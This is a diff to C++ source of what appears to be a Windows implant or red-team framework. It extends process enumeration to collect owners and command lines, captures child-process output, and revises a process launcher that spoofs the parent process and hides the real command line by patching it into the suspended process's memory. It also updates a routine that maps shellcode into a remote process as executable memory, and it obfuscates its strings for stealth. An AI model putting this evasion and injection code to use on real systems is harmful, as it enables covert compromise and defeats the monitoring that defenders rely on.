@@ -1,6 +1,8 @@
 #include <Windows.h>
 #include "utils/winapi.h"
 #include "utils/random.h"
+#include "utils/queue.h"
+#include "utils/string_aggregator.h"
 
 /*
 Returns all running processes
@@ -48,6 +50,93 @@ void WinApiCustom::GetProcessAll(OUT ULONG *pProcessInformationSizeWritten, OUT 
 }
 
 /*
+Provides more detailed information about processes. Requires output of GetProcessAll() as input.
+
+Returned result is a Queue of SYSTEM_PROCESS_INFORMATION_DETAILED structs, in which ImageName, CommandLine must be manually freed.
+
+Note: This attempts opening query handles to all processes, and might not be stealthy
+*/
+void WinApiCustom::GetProcessAllDetailed(IN PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, IN Queue *pProcessesDetailedQueue)
+{
+    if (pSystemProcessInformation == NULL)
+        return;
+
+    // Initialise variables
+    PSYSTEM_PROCESS_INFORMATION pSystemProcessInformationCurr = pSystemProcessInformation;
+    HANDLE hProcessCurrent = FALSE;
+    PPEB_DETAILED pPebProcessCurrent = NULL;
+    SECURITY_INFO_CUSTOM securityInfoProcessCurrent;
+    SYSTEM_PROCESS_INFORMATION_DETAILED processDetail;
+
+    RtlZeroMemoryCustom((PBYTE)&securityInfoProcessCurrent, sizeof(SECURITY_INFO_CUSTOM));
+
+    // Iterate through all processes
+    while (TRUE)
+    {
+        // Reset process detail
+        RtlZeroMemoryCustom((PBYTE)&processDetail, sizeof(SYSTEM_PROCESS_INFORMATION_DETAILED));
+
+        // For current process, copy the information already available at hand
+        processDetail.ImageName = (PCHAR)this->HeapAllocCustom(pSystemProcessInformationCurr->ImageName.Length + 1);
+        if (processDetail.ImageName != NULL)
+            WideStringToUtf8(pSystemProcessInformationCurr->ImageName.Buffer, processDetail.ImageName);
+
+        processDetail.SessionId = pSystemProcessInformationCurr->SessionId;
+
+        processDetail.ProcessId = (DWORD)(pSystemProcessInformationCurr->UniqueProcessId);
+
+        processDetail.VirtualSize = pSystemProcessInformationCurr->VirtualSize;
+
+        // For current process, attempt to get more information
+        hProcessCurrent = this->loadedFunctions.OpenProcess(
+            PROCESS_QUERY_INFORMATION,
+            FALSE,
+            (DWORD)(pSystemProcessInformationCurr->UniqueProcessId));
+        if (hProcessCurrent != NULL)
+        {
+            // Get necessary info from PEB
+            pPebProcessCurrent = (PPEB_DETAILED)(this->GetPebOfProcess(hProcessCurrent));
+            if (pPebProcessCurrent != NULL)
+            {
+                processDetail.IsProtectedProcess = pPebProcessCurrent->IsProtectedProcess;
+
+                processDetail.CommandLine = (PCHAR)this->HeapAllocCustom(pPebProcessCurrent->ProcessParameters->CommandLine.Length + 1);
+                if (processDetail.CommandLine != NULL)
+                    WideStringToUtf8(pPebProcessCurrent->ProcessParameters->CommandLine.Buffer, processDetail.CommandLine);
+
+                // Cleanup
+                this->HeapFreeCustom(pPebProcessCurrent);
+                pPebProcessCurrent = NULL;
+            }
+
+            // Get necessary info from security info
+            this->GetObjectSecurityInfoCustom(hProcessCurrent, SECURABLE_OBJECT_TYPE_CUSTOM::PROCESS, &securityInfoProcessCurrent);
+            processDetail.sidOwner = securityInfoProcessCurrent.sidOwner;
+            processDetail.sidGroup = securityInfoProcessCurrent.sidGroup;
+
+            if (securityInfoProcessCurrent.pAcesCustom != NULL)
+                this->HeapFreeCustom(securityInfoProcessCurrent.pAcesCustom);
+            RtlZeroMemoryCustom((PBYTE)&securityInfoProcessCurrent, sizeof(SECURITY_INFO_CUSTOM));
+
+            // Close handle to process
+            this->loadedFunctions.CloseHandle(hProcessCurrent);
+            hProcessCurrent = NULL;
+        }
+
+        // Store process details
+        pProcessesDetailedQueue->Enqueue(&processDetail, sizeof(SYSTEM_PROCESS_INFORMATION_DETAILED));
+
+        // No more processes exist
+        if (pSystemProcessInformationCurr->NextEntryOffset == 0)
+            break;
+
+        // Prepare to go to next process
+        else
+            pSystemProcessInformationCurr = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformationCurr + pSystemProcessInformation->NextEntryOffset);
+    }
+}
+
+/*
 Searches for a particular Process with name
 
 pSystemProcessInformation: Pointer to a SYSTEM_PROCESS_INFORMATION array
@@ -67,7 +156,7 @@ PSYSTEM_PROCESS_INFORMATION WinApiCustom::ProcessSearchWithName(PSYSTEM_PROCESS_
     WideStringToLower(targetProcessName, targetProcessNameLower);
 
     // In a loop, iterate through all processes, and check if it's target
-    while (pSystemProcessInformation != NULL)
+    while (TRUE)
     {
         // If process name matches, return process id
         if (pSystemProcessInformation->ImageName.Buffer != NULL)
@@ -80,8 +169,12 @@ PSYSTEM_PROCESS_INFORMATION WinApiCustom::ProcessSearchWithName(PSYSTEM_PROCESS_
         }
 
         // Else, advance to next process
-        else
+        else if (pSystemProcessInformation->NextEntryOffset != 0)
             pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
+
+        // No more processes
+        else
+            break;
     }
 
     // If execution reaches here, it means search did not find target
@@ -100,13 +193,15 @@ PSYSTEM_PROCESS_INFORMATION WinApiCustom::ProcessSearchWithId(PSYSTEM_PROCESS_IN
         return NULL;
 
     // In a loop, iterate through all processes, and check if it's target
-    while (pSystemProcessInformation != NULL)
+    while (TRUE)
     {
         // If process ID matches, return process
         if ((DWORD)pSystemProcessInformation->UniqueProcessId == targetProcessId)
             return pSystemProcessInformation;
-        else
+        else if (pSystemProcessInformation->NextEntryOffset != 0)
             pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
+        else
+            break;
     }
 
     // If execution reaches here, it means search did not find target
@@ -189,6 +284,48 @@ CLEANUP:
     return pProcessParameters;
 }
 
+#define PROCESS_OUTPUT_BUFFER_SIZE 1024
+/*
+Reads total output from a Process's STDOUT read handle
+
+Returned double-pointer must be manually freed
+*/
+void WinApiCustom::ReadOutputFromProcess(IN PHANDLE phStdoutRead, OUT VOID **ppProcessOutput, OUT PDWORD pProcessOutputSize)
+{
+    DWORD readSize = 0;
+    DWORD readTotalSize = 0;
+    BOOL isSuccess = FALSE;
+    *ppProcessOutput = NULL; // For consolidated output
+    LPVOID newBufferAddr = NULL;
+    BYTE processOutputBuffer[PROCESS_OUTPUT_BUFFER_SIZE] = ""; // For buffer output
+
+    // Start reading from process in indefinite loop
+    while (TRUE)
+    {
+        // Capture child's STDOUT and store in buffer output
+        isSuccess = this->loadedFunctions.ReadFile(*phStdoutRead, processOutputBuffer, PROCESS_OUTPUT_BUFFER_SIZE, &readSize, NULL);
+        if (!isSuccess || readSize == 0)
+            break;
+
+        // Allocate/Re-allocate memory for buffer
+        if (*ppProcessOutput == NULL)
+            newBufferAddr = this->HeapAllocCustom(readSize);
+        else
+            newBufferAddr = this->HeapReAllocCustom(*ppProcessOutput, readTotalSize + readSize);
+        if (newBufferAddr == NULL)
+            break;
+        *ppProcessOutput = newBufferAddr;
+
+        // Copy from buffer to consolidated output
+        CopyBuffer(((PBYTE)*ppProcessOutput + readTotalSize), processOutputBuffer, readSize);
+
+        // Keep track of total data read
+        readTotalSize += readSize;
+    }
+
+    *pProcessOutputSize = readTotalSize;
+}
+
 /*
 Creates a new process with all specified parameters
 
@@ -198,20 +335,29 @@ parentProcessId: ID of process to spoof as parent process; -1 to spawn from self
 pCurrentDirectory: Current directory of the new process
 createSuspended: TRUE if the process is to be created in suspended mode
 createHidden: TRUE if process should be visually hidden, i.e, no window
+pProcessInformation: Pointer to PROCESS_INFORMATION that receives process information
+phStdoutRead: Pointer to STDOUT read handle from which process output can be read; must be closed after used
 
 Returned PPROCESS_INFORMATION contains handles that must be closed after use
 */
-BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommandLineArgs, IN DWORD parentProcessId, IN PCHAR pCurrentDirectory, IN BOOL createSuspended, IN BOOL createHidden, OUT PPROCESS_INFORMATION pProcessInformation)
+BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommandLineArgs, IN DWORD parentProcessId, IN PCHAR pCurrentDirectory, IN BOOL createSuspended, IN BOOL createHidden, OUT PPROCESS_INFORMATION pProcessInformation, OUT PHANDLE phStdoutRead)
 {
+    // Validation
+    if (pImagePath == NULL)
+        return FALSE;
+
     // Initialise variables
     PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = NULL;
     HANDLE hParentProcessSpoof = NULL;
     LPPROC_THREAD_ATTRIBUTE_LIST pThreadAttributeList = NULL;
     PCHAR commandLineSpoofed = NULL;
+    PCHAR commandLineReal = NULL;
     PRTL_USER_PROCESS_PARAMETERS pProcessParameters = NULL;
-    PWCHAR pCommandLineArgsW = NULL;
+    PWCHAR pCommandLineW = NULL;
     BOOL isSuccess = FALSE;
+    DWORD imagePathLen = StrLen(pImagePath);
     DWORD commandLineArgsLen = 0;
+    DWORD commandLineLen = 0;
 
     // Get list of all running processes
     ULONG systemProcessInformationSize = 0;
@@ -263,28 +409,50 @@ BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommand
         startupInfo.wShowWindow = SW_HIDE;
     }
 
-    //// For capturing output and error
-    // startupInfo.dwFlags |= STARTF_USESTDHANDLES;
-    // startupInfo.hStdOutput = ;
-    // startupInfo.hStdError = ;
+    //// Create anonymous pipe to capture STDOUT and STDERR from process
+    SECURITY_ATTRIBUTES secAttr;
+    RtlZeroMemoryCustom((PBYTE)(&secAttr), sizeof(SECURITY_ATTRIBUTES));
+    secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    secAttr.bInheritHandle = TRUE;
+    secAttr.lpSecurityDescriptor = NULL;
+
+    HANDLE hStdoutWrite = NULL;
+    if (!this->loadedFunctions.CreatePipe(phStdoutRead, &hStdoutWrite, &secAttr, 0))
+        goto CLEANUP;
+    if (*phStdoutRead == NULL || hStdoutWrite == NULL)
+        goto CLEANUP;
+
+    startupInfo.dwFlags |= STARTF_USESTDHANDLES;
+    startupInfo.hStdOutput = hStdoutWrite;
+    startupInfo.hStdError = hStdoutWrite;
 
     STARTUPINFOEXA startupInfoEx;
     RtlZeroMemoryCustom((PBYTE)(&startupInfoEx), sizeof(startupInfoEx));
     startupInfoEx.StartupInfo = startupInfo;
     startupInfoEx.lpAttributeList = pThreadAttributeList;
 
-    // Create spoofed command line
+    // Create spoofed commandline
+    if (pCommandLineArgs != NULL)
+        commandLineArgsLen = StrLen(pCommandLineArgs);
+
+    //// Create buffer
+    commandLineLen = 1 + imagePathLen + 1 + (pCommandLineArgs == NULL ? 0 : (1 + commandLineArgsLen)); // "imagePath" arg1
+    commandLineSpoofed = (PCHAR)(this->HeapAllocCustom(commandLineLen + 1));
+    if (commandLineSpoofed == NULL)
+        goto CLEANUP;
+
+    //// Copy image path into command line
+    ConcatString(commandLineSpoofed, "\"");
+    ConcatString(commandLineSpoofed, pImagePath);
+    ConcatString(commandLineSpoofed, "\"");
+
+    //// Add spoofed params into command line
     if (pCommandLineArgs != NULL)
     {
-        commandLineArgsLen = StrLen(pCommandLineArgs);
-        if (commandLineArgsLen != 0)
-        {
-            commandLineSpoofed = (PCHAR)(this->HeapAllocCustom(commandLineArgsLen + 1));
-            if (commandLineSpoofed == NULL)
-                goto CLEANUP;
-            RandomGenerator randomGenerator = RandomGenerator(this);
-            randomGenerator.GenerateRandomStr(commandLineArgsLen, commandLineSpoofed);
-        }
+        ConcatString(commandLineSpoofed, " ");
+
+        RandomGenerator randomGenerator = RandomGenerator(this);
+        randomGenerator.GenerateRandomStr(commandLineArgsLen, commandLineSpoofed);
     }
 
     // Create process
@@ -294,8 +462,8 @@ BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommand
             (commandLineArgsLen == 0 ? NULL : commandLineSpoofed),
             NULL,
             NULL,
-            FALSE,
-            (threadAttributeListSize == 0 ? 0 : EXTENDED_STARTUPINFO_PRESENT) | (createHidden ? CREATE_NO_WINDOW : 0) | CREATE_SUSPENDED,
+            TRUE,
+            (threadAttributeListSize == 0 ? 0 : EXTENDED_STARTUPINFO_PRESENT) | (createHidden ? CREATE_NO_WINDOW : 0) | CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
             NULL,
             pCurrentDirectory,
             (LPSTARTUPINFOA)(&startupInfoEx),
@@ -305,27 +473,38 @@ BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommand
     // Fix commandline of new process
     if (pCommandLineArgs != NULL && commandLineArgsLen != 0)
     {
-        //// Get new process's args
+        //// Prepare real commandline
+        commandLineReal = (PCHAR)(this->HeapAllocCustom(commandLineLen + 1));
+        if (commandLineReal == NULL)
+            goto CLEANUP;
+
+        ConcatString(commandLineReal, "\"");
+        ConcatString(commandLineReal, pImagePath);
+        ConcatString(commandLineReal, "\" ");
+        ConcatString(commandLineReal, pCommandLineArgs);
+
+        //// Get new process's commandline
         PRTL_USER_PROCESS_PARAMETERS pProcessParametersInTargetProcess = NULL;
         pProcessParameters = this->GetProcessParameters(pProcessInformation->hProcess, &pProcessParametersInTargetProcess);
         if (pProcessParameters == NULL)
             goto CLEANUP;
 
         //// Patch commandline
-        DWORD commandLineArgsWSize = (commandLineArgsLen + 1) * sizeof(WCHAR);
-        pCommandLineArgsW = (PWCHAR)(this->HeapAllocCustom(commandLineArgsWSize));
-        if (pCommandLineArgsW == NULL)
+        DWORD commandLineWSize = (commandLineLen + 1) * sizeof(WCHAR);
+        pCommandLineW = (PWCHAR)(this->HeapAllocCustom(commandLineWSize));
+        if (pCommandLineW == NULL)
             goto CLEANUP;
-        Utf8ToWideString(pCommandLineArgs, pCommandLineArgsW);
+
+        Utf8ToWideString(commandLineReal, pCommandLineW);
 
         SIZE_T patchSize = 0;
         this->loadedFunctions.WriteProcessMemory(
             pProcessInformation->hProcess,
             pProcessParameters->CommandLine.Buffer,
-            pCommandLineArgsW,
-            commandLineArgsWSize,
+            pCommandLineW,
+            commandLineWSize,
             &patchSize);
-        if (patchSize == 0)
+        if (patchSize != commandLineWSize)
             goto CLEANUP;
 
         //// Patch commandline length to Zero
@@ -338,7 +517,7 @@ BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommand
             &commandLineSizeToWrite,
             sizeof(commandLineSizeToWrite),
             &patchSize);
-        if (patchSize == 0)
+        if (patchSize != sizeof(commandLineSizeToWrite))
             goto CLEANUP;
     }
 
@@ -350,6 +529,9 @@ BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommand
     isSuccess = TRUE;
 
 CLEANUP:
+    if (hStdoutWrite != NULL)
+        this->loadedFunctions.CloseHandle(hStdoutWrite);
+
     if (pSystemProcessInformation != NULL)
         this->HeapFreeCustom(pSystemProcessInformation);
 
@@ -365,11 +547,14 @@ CLEANUP:
     if (commandLineSpoofed != NULL)
         this->HeapFreeCustom(commandLineSpoofed);
 
+    if (commandLineReal != NULL)
+        this->HeapFreeCustom(commandLineReal);
+
     if (pProcessParameters != NULL)
         this->HeapFreeCustom(pProcessParameters);
 
-    if (pCommandLineArgsW != NULL)
-        this->HeapFreeCustom(pCommandLineArgsW);
+    if (pCommandLineW != NULL)
+        this->HeapFreeCustom(pCommandLineW);
 
     if (!isSuccess)
     {
@@ -465,11 +650,220 @@ BOOL WinApiCustom::ProcessTerminate(DWORD processId)
 }
 
 /*
-Describes a process listing
+Describes a process listing. This requires output of GetProcessAll().
+
+This tries opening query handles to all processes, and might not be stealthy.
+
+Returned double-pointer must be manually freed
 */
-void WinApiCustom::DescribeProcessListing(IN PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, OUT PCHAR pOutput, OUT PDWORD pOutputSize)
+void WinApiCustom::DescribeProcessListing(IN PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, OUT CHAR **ppOutput, OUT PDWORD pOutputSize)
 {
-    // TODO
+    if (pSystemProcessInformation == NULL)
+        return;
+
+    // Initialise
+    ULONG processInformationSizeWritten = 0;
+    PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = NULL;
+    Queue processDetailedQueue = Queue(this, FALSE);
+    PSYSTEM_PROCESS_INFORMATION_DETAILED pProcessDetail;
+    StringAggregator stringAggregator = StringAggregator(this, FALSE);
+    CHAR strProcessDetail[23] = "";
+    PCHAR pUsername = NULL, pDomain = NULL, pSid = NULL;
+
+    static CHAR strOWNER[STRING_OWNER_LEN + 1] = ""; // "OWNER"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_OWNER,
+        STRING_OWNER_LEN,
+        strOWNER);
+    static CHAR strGROUP[STRING_GROUP_LEN + 1] = ""; // "GROUP"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_GROUP,
+        STRING_GROUP_LEN,
+        strGROUP);
+    static CHAR strPID[STRING_PID_LEN + 1] = ""; // "PID"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_PID,
+        STRING_PID_LEN,
+        strPID);
+    static CHAR strIMAGE[STRING_IMAGE_LEN + 1] = ""; // "IMAGE"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_IMAGE,
+        STRING_IMAGE_LEN,
+        strIMAGE);
+    static CHAR strCOMMANDLINE[STRING_COMMANDLINE_LEN + 1] = ""; // "COMMANDLINE"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_COMMANDLINE,
+        STRING_COMMANDLINE_LEN,
+        strCOMMANDLINE);
+    static CHAR strSESSION_ID[STRING_SESSION_ID_LEN + 1] = ""; // "SESSION_ID"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_SESSION_ID,
+        STRING_SESSION_ID_LEN,
+        strSESSION_ID);
+    static CHAR strVIRTUAL_SIZE[STRING_VIRTUAL_SIZE_LEN + 1] = ""; // "VIRTUAL_SIZE"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_VIRTUAL_SIZE,
+        STRING_VIRTUAL_SIZE_LEN,
+        strVIRTUAL_SIZE);
+    static CHAR strPROTECTED[STRING_PROTECTED_LEN + 1] = ""; // "PROTECTED"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_PROTECTED,
+        STRING_PROTECTED_LEN,
+        strPROTECTED);
+    static CHAR strYES[STRING_YES_LEN + 1] = ""; // "YES"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_YES,
+        STRING_YES_LEN,
+        strYES);
+    static CHAR strNO[STRING_NO_LEN + 1] = ""; // "NO"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_NO,
+        STRING_NO_LEN,
+        strNO);
+
+    // Get all processes
+    this->GetProcessAll(&processInformationSizeWritten, &pSystemProcessInformation);
+    if (pSystemProcessInformation == NULL)
+        goto CLEANUP;
+    this->GetProcessAllDetailed(pSystemProcessInformation, &processDetailedQueue);
+
+    // Iterate through all processes
+    while (processDetailedQueue.GetSize() != 0)
+    {
+        pProcessDetail = (PSYSTEM_PROCESS_INFORMATION_DETAILED)(processDetailedQueue.Dequeue());
+
+        /*
+        Parse process detail and add to string aggregator
+
+        PID: ProcessId
+        Image: ImageName
+        Commandline: CommandLine
+        SessionId: SessionId
+        Owner: Owner
+        Owner: Group
+        VirtualSize: VirtualSize
+        IsProtected: IsProtected
+        */
+
+        //// ProcessID
+        stringAggregator.AddString(strPID);
+        stringAggregator.AddString(": ");
+        Integer32ToString(pProcessDetail->ProcessId, strProcessDetail);
+        stringAggregator.AddString(strProcessDetail);
+        stringAggregator.AddString("\n");
+
+        //// Image name
+        stringAggregator.AddString(strIMAGE);
+        stringAggregator.AddString(": ");
+        stringAggregator.AddString(pProcessDetail->ImageName);
+        stringAggregator.AddString("\n");
+
+        //// Commandline
+        stringAggregator.AddString(strCOMMANDLINE);
+        stringAggregator.AddString(": ");
+        stringAggregator.AddString(pProcessDetail->CommandLine);
+        stringAggregator.AddString("\n");
+
+        //// Session ID
+        stringAggregator.AddString(strSESSION_ID);
+        stringAggregator.AddString(": ");
+        Integer64ToString(pProcessDetail->SessionId, strProcessDetail);
+        stringAggregator.AddString(strProcessDetail);
+        stringAggregator.AddString("\n");
+
+        //// Owner
+        this->DescribeSid(&(pProcessDetail->sidOwner), &pSid, &pUsername, &pDomain);
+
+        stringAggregator.AddString(strOWNER);
+        stringAggregator.AddString(": ");
+        stringAggregator.AddString(pDomain == NULL ? "??" : pDomain);
+        stringAggregator.AddString(pDomain == NULL ? "" : "/");
+        stringAggregator.AddString(pUsername == NULL ? "??" : pUsername);
+        stringAggregator.AddString(" {");
+        stringAggregator.AddString(pSid == NULL ? "S-??" : pSid);
+        stringAggregator.AddString("}\n");
+
+        if (pDomain != NULL)
+        {
+            this->HeapFreeCustom(pDomain);
+            pDomain = NULL;
+        };
+        if (pUsername != NULL)
+        {
+            this->HeapFreeCustom(pUsername);
+            pUsername = NULL;
+        };
+        if (pSid != NULL)
+        {
+            this->HeapFreeCustom(pSid);
+            pSid = NULL;
+        };
+
+        //// Group
+        this->DescribeSid(&(pProcessDetail->sidGroup), &pSid, &pUsername, &pDomain);
+
+        stringAggregator.AddString(strGROUP);
+        stringAggregator.AddString(": ");
+        stringAggregator.AddString(pDomain == NULL ? "??" : pDomain);
+        stringAggregator.AddString(pDomain == NULL ? "" : "/");
+        stringAggregator.AddString(pUsername == NULL ? "??" : pUsername);
+        stringAggregator.AddString(" {");
+        stringAggregator.AddString(pSid == NULL ? "S-??" : pSid);
+        stringAggregator.AddString("}\n");
+
+        if (pDomain != NULL)
+        {
+            this->HeapFreeCustom(pDomain);
+            pDomain = NULL;
+        };
+        if (pUsername != NULL)
+        {
+            this->HeapFreeCustom(pUsername);
+            pUsername = NULL;
+        };
+        if (pSid != NULL)
+        {
+            this->HeapFreeCustom(pSid);
+            pSid = NULL;
+        };
+
+        //// VirtualSize
+        stringAggregator.AddString(strVIRTUAL_SIZE);
+        stringAggregator.AddString(": ");
+        Integer64ToString(pProcessDetail->VirtualSize, strProcessDetail);
+        stringAggregator.AddString(strProcessDetail);
+        stringAggregator.AddString("\n");
+
+        //// IsProtected
+        stringAggregator.AddString(strPROTECTED);
+        stringAggregator.AddString(": ");
+        stringAggregator.AddString(pProcessDetail->IsProtectedProcess ? strYES : strNO);
+
+        //// Newline
+        stringAggregator.AddString("\n----------------------\n");
+
+        // CLEANUP
+        if (pProcessDetail->ImageName != NULL)
+            this->HeapFreeCustom(pProcessDetail->ImageName);
+        if (pProcessDetail->CommandLine != NULL)
+            this->HeapFreeCustom(pProcessDetail->CommandLine);
+    }
+
+    // Combine all strings
+    *pOutputSize = stringAggregator.GetTotalLengthOfAllStrings() + 1;
+    if (*pOutputSize != 0)
+    {
+        *ppOutput = (PCHAR)(this->HeapAllocCustom(*pOutputSize));
+        if (*ppOutput == NULL)
+            *pOutputSize = 0;
+        else
+            stringAggregator.CombineAllStrings(*ppOutput);
+    }
+
+    // CLEANUP
+CLEANUP:
+    if (pSystemProcessInformation != NULL)
+        this->HeapFreeCustom(pSystemProcessInformation);
 }
 
 /*
@@ -641,14 +1035,16 @@ BOOL WinApiCustom::ProcessInjectShellcodeRemote(HANDLE hTargetProcess, HANDLE hT
         CopyBuffer(pShellcodeExecutableCurrentProcess, pShellcode, shellcodeSize);
 
         // Map this shared memory into target process (this contains executable shellcode now)
-        pShellcodeExecutableTargetProcess = this->loadedFunctions.MapViewOfFile2(
+        pShellcodeExecutableTargetProcess = this->loadedFunctions.MapViewOfFile3(
             hFileMapping,
             hTargetProcess,
-            0,
             NULL,
             0,
             0,
-            PAGE_EXECUTE_READ);
+            0,
+            PAGE_EXECUTE_READ,
+            NULL,
+            0);
         if (pShellcodeExecutableTargetProcess == NULL)
             goto CLEANUP;
 
